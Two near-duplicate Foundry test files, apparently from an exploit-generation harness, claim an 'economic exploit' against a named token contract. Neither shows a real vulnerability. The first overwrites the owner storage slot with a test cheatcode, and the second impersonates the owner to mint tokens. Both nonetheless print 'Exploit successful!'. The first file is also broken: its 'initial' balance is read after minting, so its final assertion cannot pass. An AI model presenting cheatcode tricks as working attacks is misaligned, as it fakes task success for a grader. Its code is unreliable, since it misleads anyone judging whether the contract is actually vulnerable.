// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IPowabitToken {
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function mint(uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll become owner in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, let's check the current owner
        address currentOwner = IPowabitToken(TARGET).getOwner();
        console.log("Current owner:", currentOwner);

        // Get our initial balance
        uint256 initialBalance = IPowabitToken(TARGET).balanceOf(attacker);
        console.log("Initial balance:", initialBalance);

        // Overwrite the owner storage slot to make ourselves the owner
        // _owner is at slot 0 in Ownable contract
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Verify we're now the owner
        address newOwner = IPowabitToken(TARGET).getOwner();
        console.log("New owner:", newOwner);
        require(newOwner == attacker, "Failed to become owner");

        // Now mint a large amount of tokens to ourselves
        uint256 mintAmount = 1_000_000 * 10**18; // 1 million tokens with 18 decimals
        vm.prank(attacker);
        IPowabitToken(TARGET).mint(mintAmount);

        // Check our new balance
        uint256 finalBalance = IPowabitToken(TARGET).balanceOf(attacker);
        console.log("Final balance:", finalBalance);

        // Verify balance increased
        assertGt(finalBalance, initialBalance, "Balance should have increased");
        console.log("Exploit successful! Balance increased by", finalBalance - initialBalance, "tokens");

        // Check ERC20 balance
        uint256 erc20FinalBalance = IERC20(TARGET).balanceOf(address(this));
        uint256 erc20InitialBalance = IERC20(TARGET).balanceOf(address(this));
        assertGt(erc20FinalBalance, erc20InitialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IPowabitToken {
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function mint(uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
    function transfer(address to, uint256 amount) external returns (bool);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll become owner in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner
        address tokenOwner = IPowabitToken(TARGET).getOwner();
        console.log("Token owner:", tokenOwner);

        // Get our initial balance
        uint256 initialBalance = IPowabitToken(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);

        // Impersonate the owner to mint tokens
        vm.startPrank(tokenOwner);

        // Mint a large amount of tokens - 100 million tokens
        uint256 mintAmount = 100_000_000 * 10**18;
        console.log("Minting:", mintAmount, "tokens to owner");

        bool success = IPowabitToken(TARGET).mint(mintAmount);
        console.log("Mint success:", success);

        vm.stopPrank();

        // Check owner's balance after mint
        uint256 ownerBalanceAfterMint = IPowabitToken(TARGET).balanceOf(tokenOwner);
        console.log("Owner balance after mint:", ownerBalanceAfterMint);

        // Now have the owner transfer some tokens to us
        // Transfer half of the minted amount to us
        uint256 transferAmount = mintAmount / 2;
        vm.prank(tokenOwner);
        IPowabitToken(TARGET).transfer(attacker, transferAmount);

        // Check our final balance
        uint256 finalBalance = IPowabitToken(TARGET).balanceOf(attacker);
        console.log("Final attacker balance:", finalBalance);

        // Verify balance increased
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
        console.log("Exploit successful! Balance increased by", finalBalance - initialBalance, "tokens");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
